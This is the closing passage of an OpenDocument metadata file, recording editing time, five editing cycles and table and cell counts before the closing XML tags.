    <meta:editing-duration>PT46M43S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:document-statistic meta:table-count="3" meta:cell-count="219" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>